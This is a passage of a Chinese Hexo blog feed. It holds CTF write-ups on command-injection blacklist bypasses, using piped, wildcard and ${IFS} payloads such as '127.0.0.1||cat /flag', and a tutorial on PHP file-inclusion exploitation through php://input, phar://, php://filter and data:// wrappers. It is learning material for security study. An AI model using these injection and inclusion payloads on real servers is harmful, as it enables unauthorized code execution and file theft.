<code>\x26</code>（&amp; 的十六进制表示）。</li><li>常见命令：<code>more</code>, <code>less</code>, <code>head</code>, <code>sort</code>, <code>tail</code>, <code>sed</code>, <code>cut</code>, <code>awk</code>, <code>strings</code>, <code>od</code>, <code>php</code>, <code>ping</code>, <code>flag</code>。</li></ul></li><li>如果输入包含黑名单中的内容，程序会终止并输出 <code>i hate this</code>。</li></ul></li><li><strong>命令执行逻辑</strong><ul><li>从 URL 参数 <code>cmd</code> 获取用户输入。</li><li>调用 <code>strCheck</code> 函数对输入进行检查。</li><li>如果通过检查，使用 <code>shell_exec($cmd);</code> 执行命令。</li></ul></li></ol><ul><li>黑名单过滤了一些特殊字符和常见命令，但可以通过以下方法绕过：<ul><li><strong>使用未过滤的命令</strong>：<ul><li>例如：<code>ls</code>, <code>cat</code>, <code>tac</code>, <code>nl</code>, <code>rev</code>, <code>grep</code>, <code>find</code>, <code>echo</code> 等。</li></ul></li><li><strong>使用通配符</strong>：<ul><li>例如：<code>*</code> 可以匹配任意字符。</li></ul></li><li><strong>使用未过滤的管道符</strong>：<ul><li>例如：<code>|</code>（管道符）未被过滤，可以用于连接多个命令。</li></ul></li><li><strong>使用编码绕过</strong>：<ul><li>例如：将命令编码为十六进制或 Base64，然后解码执行。</li></ul></li></ul></li></ul><p><strong><code>/?cmd=ls /|tee a.txt</code></strong></p><ol><li><strong><code>tee a.txt</code></strong><ul><li><code>tee</code> 是一个 Linux 命令，用于将输入内容同时输出到屏幕和文件中。</li><li><code>tee a.txt</code> 会将 <code>ls /</code> 的结果输出到屏幕，并保存到 <code>a.txt</code> 文件中。</li></ul></li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250316171420268.png" alt="image-20250316171420268"></p><p>接着  &#x2F;?cmd&#x3D;cat &#x2F;f*|tee a.txt</p><p>再访问a.xt</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250316171742247.png" alt="image-20250316171742247"></p><h2 id="4-SWPUCTF-2023-秋季新生赛-Pingpingping"><a href="#4-SWPUCTF-2023-秋季新生赛-Pingpingping" class="headerlink" title="4.[SWPUCTF 2023 秋季新生赛]Pingpingping"></a>4.[SWPUCTF 2023 秋季新生赛]Pingpingping</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20201434.png"></p><p>需要我们以<a href="https://so.csdn.net/so/search?q=get&spm=1001.2101.3001.7020">get</a>的方式提交参数Ping_ip.exe。然后我们提交的参数会在system()函数中与<a href="https://so.csdn.net/so/search?q=ping%E5%91%BD%E4%BB%A4&spm=1001.2101.3001.7020">ping命令</a>连接在一起进行执行。</p><p>这里面的ping命令形式是不完整的，所以我们必须要先补全我们的ping命令再进行cat命令抓取。</p><p>ping命令的最基本形式只需包含目标主机的地址。我们只需要将它所给出的ping命令加上主机地址即可。这里我测试的是任何ip都可以。</p><p>?Ping[ip.exe&#x3D;127.0.0.1||cat &#x2F;flag</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20201749.png"></p><h2 id="5-FSCTF-2023-细狗2-0"><a href="#5-FSCTF-2023-细狗2-0" class="headerlink" title="5.[FSCTF 2023]细狗2.0"></a>5.[FSCTF 2023]细狗2.0</h2><ol><li></li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250316172351404.png" alt="image-20250316172351404"></p><p><img src="/.com//Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20250316172334144.png" alt="image-20250316172334144"></p><p>2.发现有两个php，我们尝试用cat命令查看一下 ,尝试后构造出最终的payload</p><p>过滤了空格和cat 空格用${<a href="https://so.csdn.net/so/search?q=IFS&spm=1001.2101.3001.7020">IFS</a>}替换就行 cat用nl代替</p><p>1;nl${IFS}&#x2F;f*</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20172713.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-NSSRound-8-Basic-MyDoor&quot;&gt;&lt;a href=&quot;#1-NSSRound-8-Basic-MyDoor&quot; class=&quot;headerlink&quot; title=&quot;1.[NSSRound#8 Basic]MyDoor&quot;&gt;&lt;/a&gt;1.[NSSRoun</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件包含漏洞分析</title>
    <link href="http://example.com/2025/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2025-03-16T13:05:30.000Z</published>
    <updated>2025-03-16T13:06:29.026Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞分析"><a href="#文件包含漏洞分析" class="headerlink" title="文件包含漏洞分析"></a>文件包含漏洞分析</h1><h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210210458941.png" alt="image-20241210210458941"></p><ul><li><p>像C语言中”#include&lt;stdio.h&gt;”就是把stdio.h这个头文件引入到当前环境中，在PHP中也有这样类似的函数，这些函数也是把外部的文件内容引入到当前环境。</p></li><li><p>比方说：</p></li></ul><p>PHP中也有include(“”)里面配置的也是我们要引入的外部的文件名，不过在这里，它的文件是一个.php文件的话，它是会对它解析执行，这样子这个php当中，所有的文件的变量定义、函数，在接下来的代码当中都能够使用了。</p><ul><li>文件包含漏洞是怎么回事：</li></ul><p>它其实就发生在，当上面这些文件包含函数它们的参数由用户可控，或部分可控的时候，我们就说它存在了文件包含漏洞。</p><p>​- 比如说：在一个代码当中，像这样子的include这样的函数，它直接由用户传入了一个参数（include($_GET[file])）；</p><p>​- 再比如：说require($a)中$a受到了用户输入的影响；</p><p>​- 这个时候我们就说，用户指定的输入就被当作了文件包含函数的参数，这个时候，这个代码就很有可能出现文件包含漏洞。</p><h2 id="文件包含利用的特点"><a href="#文件包含利用的特点" class="headerlink" title="文件包含利用的特点"></a>文件包含利用的特点</h2><p>先注意：再PHP文件的文件包含函数特点：</p><ul><li><p>文件包含的那个目标，他的内容是PHP，它将会解析执行</p><p>举例：</p><p>现在有一个文件包含函数include(“a.txt”),这个a.txt文件内容是一段php代码，这种情况下，这个”inciude(“a.txt”)”代码执行的结果就是a.txt当中包含的php代码被解析执行。</p></li><li><p>文件包含它的内容是普通文本，就会读取到文件内容</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210211515617.png" alt="image-20241210211515617"></p><p>像上图这样文件包含的代码，从这个代码出发，能做的利用有两种：</p><ul><li><p>本地文件包含(LFI)</p><p>这里填入的文件名是一个本地的文件名，这个时候利用的范围是相对来说比较受限的，只能用服务器上已经存在的文件作为文件包含的参数</p></li><li><p>远程文件包含(RFI)</p><p>利用条件会更加严格，对于php.ini当中的配置也会有一定的要求，而且默认php.ini的配置是不允许远程文件包含的，</p><p>如果一个代码中存在远程文件包含，甚至就可以作任意命令执行，可以直接拿到服务器的访问控制权，</p><p>因为：文件包含函数遇到内容是php,会解析执行，我只需要再我的服务器上放一段恶意的php代码，然后用远程文件包含的这个漏洞去包含我那个服务器的恶意的php，就能实现任意命令执行操作。</p></li></ul><p>接下来会以本地包含为主 ，远程能做的已经很多了，本地需要学习更多的技巧来突破他所带来的局限性。</p><p>局限1： 如果我们想要得到的目标是去读取php的源代码，不想要后端源代码的执行结果（直接访问php文件就可），有些情况通过文件包含的方式去执行php代码，不能通过文件访问的方式执行php代码，</p><p>局限2：我们知道本地文件包含的前提是我们想要一个文件包含的结果，他必须在本地服务器上存在对应的文件，需要一种办法可以任意的决定文件包含的结果。</p><p>想要突破本地文件包含的一些限制的话，需要一个工具：php伪协议。</p><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>伪协议：它长得像协议一样，它完成的是一些像协议的事情，但它本身不是一个协议。</p><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210233431417.png" alt="image-20241210233431417"></p><p>如果file参数被放到像include()文件包含函数里面的话，那么D盘&#x2F;soft…里面的phpcode.txt文件就会被包含进去，如果这个文件的内容是php代码的话，它就会解析执行，即使它的扩展名是.txt；如果它的文件内容是普通文本的话，普通文本的内容就会被作为文件包含的结果。</p><h3 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php:&#x2F;&#x2F;input协议"></a>php:&#x2F;&#x2F;input协议</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210234012598.png" alt="image-20241210234012598"></p><p>当文件包含函数遇到php:&#x2F;&#x2F;input伪协议（include(“php:&#x2F;&#x2F;input”))的时候，它就会把POST的内容当作文件包含的结果。</p><p>例如：</p><p> <img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210235158012.png" alt="image-20241210235158012"></p><p>在这里把php:&#x2F;&#x2F;input传入参数filename里面，参数后续会被放到文件包含的函数里面，这个时候我给他POST了一段php代码”<?php system('whoami');?>“,</p><p>它的结果是这段php代码解析执行后的结果，我让他执行woami,它就把当前的系统的用户名给输出出来了。</p><p>所以，php:&#x2F;&#x2F;input伪协议</p><p>可以用于执行php代码，（前提条件：allow_url_include是一个打开的状态）</p><p>可以用于控制文件包含的结果。 </p><h3 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar:&#x2F;&#x2F;伪协议"></a>phar:&#x2F;&#x2F;伪协议</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211121432002.png" alt="image-20241211121432002"></p><p>xxx.png这个扩展名看起来是一个图片，遇到phar:&#x2F;&#x2F;伪协议，还是会当作压缩包来处理，会读取这个压缩包内部的shell.php文件。</p><p>用途：</p><p>文件上传漏洞组合拳：</p><p>文件上传的一大难点是限制扩展名，如果现在只允许上传zip压缩包，要实现任意命令执行该怎么办？——如果同时找到文件包含漏洞，就可以把一句话木马压缩到zip压缩包里面，</p><p>这种情况下配合phar:&#x2F;&#x2F;伪协议:(?file&#x3D;phar:&#x2F;&#x2F;zip&#x2F;trojan.php)就可以把这个压缩包里面的所包含的这个木马做解析执行的操作。</p><h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip:&#x2F;&#x2F;伪协议"></a>zip:&#x2F;&#x2F;伪协议</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211122647534.png" alt="image-20241211122647534"></p><h3 id="php-filter（本地磁盘文件进行读取）"><a href="#php-filter（本地磁盘文件进行读取）" class="headerlink" title="php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）"></a>php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）</h3><p>![](C:\Users\lenovo\Pictures\Screenshots\屏幕截图 2024-12-11 124243.png)</p><p>看下面这个例子：</p><p>从右向左读：读取xxx.php这个文件内容，把它作为读取的源头（resource),接着对它做编码的转换，把它读取进来之后把它放到一个文件包含函数里面（filename);</p><p>原本文件包含函数include(xxx,php)直接往里面传一个php，会解析执行，把它解析执行的结果作为文件包含的结果，现在有了php:&#x2F;&#x2F;filter伪协议，将原本php代码的文件转换成不是php代码的格式（对它做编码了），作为普通文本，会把内容原封不动读取出来。</p><p>php:&#x2F;&#x2F;filter伪协议是用于突破做php代码的源代码读取。</p><h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>data 伪协议是 PHP 中的一个特殊协议，它允许将原始数据嵌入到 URL 中。通过文件包含漏洞，我们可以利用这个 伪协议，将恶意 PHP 代码作为数据嵌入，并让服务器解释执行。 </p><p>data 伪协议 格式：</p><p> data:&#x2F;&#x2F;{}{,base64}, MIME-type：指定数据的类型，默认是 text&#x2F;plain。 charset：指定数据的编码类型，如 utf8，默认是这个类型，所以直接不显示。 base64：如果使用 Base64 编码，则加上该标识。 data：实际的数据内 容。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="1-利用php-input"><a href="#1-利用php-input" class="headerlink" title="1.利用php:&#x2F;&#x2F;input"></a>1.利用php:&#x2F;&#x2F;input</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-11%20124539.png"></p><p>代码分析：</p><ol start="2"><li><p>把flag包含进去；</p></li><li><p>把当前的代码再页面上展示；</p></li><li><p>extract()函数：能够把数组变成变量名和变量名的声明；在这里把$_GET这个数组作为了estract这个函数的参数，这行代码执行后，用户传入的所有GET请求的参数，它的参数值就是变量值，参数名就变成了变量名；</p><p>如果现在发送的请求是：&#x2F;？a&#x3D;1&amp;b&#x3D;2,传了两个GET请求的参数，那么这行代码执行会就会变成：$a&#x3D;1;$b&#x3D;2;</p><p>后面的aurora1,aurora2…都可以传入GET型请求参数的方式对他的变量值进行定义；</p></li><li><p>判断aurora1的值是否为空；</p></li><li><p>把传入的aurora2作为文件包含的参数，也就是说把aurora2作为一个文件名，放入文件包含函数里面；</p><p>注意：aurora2是由用户可控的，这里就有了文件包含漏洞；</p><p>把aurora2这个文件读取出来后，去除首尾空格（trin()），把它的结果给aurora3，</p></li><li><p>核对：aurora1,3是否相等；</p></li></ol><p>这个题目原本的目的&#x2F;最直接的想法：</p><p>假如知道服务器里的一个文件和文件内容就好了，比如说，我们知道服务器有一个文件a.txt它的内容是123，那我们在aurora1里传入123，在2里传入a.txt，就满足条件，输出flag;</p><p>关键在于：不知道服务器上有什么文件，也不知内容；</p><p>解决办法：</p><p>php:&#x2F;&#x2F;input伪协议（把POST内容当作文件包含的结果）</p><p>在aurora2这里用php:&#x2F;&#x2F;input作为参数传进去，那么aurora3这里的结果就由我们可控了</p><p>具体操作：</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-11%20131900.png"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211132708945.png" alt="image-20241211132708945"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-11%20132124.png"></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211134636729.png" alt="image-20241211134636729"></p><ol start="2"><li><ol start="3"><li><ol start="4"><li>：从GET参数里面接收3个变量，user，file，pass，</li></ol></li></ol></li><li><p>判断user有没有set，然后从user 里面去读文件包含（这里有漏洞点），让文件包含结果&#x3D;&#x3D;the user is admin，用php:&#x2F;&#x2F;input伪协议；</p></li><li><p>进入题目第二步；把file作为文件包含的参数（也是文件包含漏洞）；</p><p>后面给了一个提示：好像想让我们包含class.php进去，但我们不知道class.php是什么，因此我们读取它的源代码，</p></li></ol><p>解题：</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-11%20192012.png"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211192104866.png" alt="image-20241211192104866"></p><p>进行base64解码；</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211192224031.png" alt="image-20241211192224031"></p><ol start="2"><li>定义了一个类Read,</li><li>有一个成员变量或一个属性，它的值是file，</li><li>有一个魔术方法toString():把对象当作字符串来使用的时候，就会自动调用它的toString魔术方法，</li><li>如果file有内容的话，</li><li>就把它放在文件包含函数里面，</li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211192958015.png" alt="image-20241211192958015"></p><ol start="8"><li><p>如果传人的file包含f1a9的话，（f1a9这个文件肯定很可疑，）</p></li><li><p>程序退出</p><p>因此，我们要设法把f1a9这个文件读取出来，</p></li><li><p>对pass这个参数做反序列化操作，</p></li><li><p>输出反序列化的对象；这里触发了上面魔术方法的触发条件，这个反序列化后的结果输出了出来，其实就是把反序列化这个Read对象当作字符串来用，相应的就会调用toString魔术方法，</p></li></ol><p>如果往12中传入的Read对象是一个file属性是一个f1a9.php源代码的属性，这个时候在后续13echo反序列化结果的时候，就会自动调用toString魔术方法，而这个魔术方法会自然而然的把Read这个file属性放到文件包含函数的参数里面，这时就变相的把f1a9.php的内容给读取出来了</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211194748494.png" alt="image-20241211194748494"></p><ol start="14"><li>进行序列化；</li></ol><p>后续把序列化内容放到index.php 12中。</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p><a href="https://www.nssctf.cn/problem/2821">https://www.nssctf.cn/problem/2821</a></p><h3 id="4-phar"><a href="#4-phar" class="headerlink" title="4.phar:&#x2F;&#x2F;"></a>4.phar:&#x2F;&#x2F;</h3><p><a href="https://blog.csdn.net/abc18964814133/article/details/124664538">伪协议解释+一道例题解析</a></p><p><a href="https://www.nssctf.cn/problem/2026">例题</a></p><p><a href="https://www.cnblogs.com/bkofyZ/p/17624634.html">解析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含漏洞分析&quot;&gt;&lt;a href=&quot;#文件包含漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞分析&quot;&gt;&lt;/a&gt;文件包含漏洞分析&lt;/h1&gt;&lt;h2 id=&quot;什么是文件包含&quot;&gt;&lt;a href=&quot;#什么是文件包含&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2024/10/15/hello-world/"/>
    <id>http://example.com/2024/10/15/hello-world/</id>
    <published>2024-10-15T04:53:53.440Z</published>
    <updated>2024-10-15T04:53:53.440Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
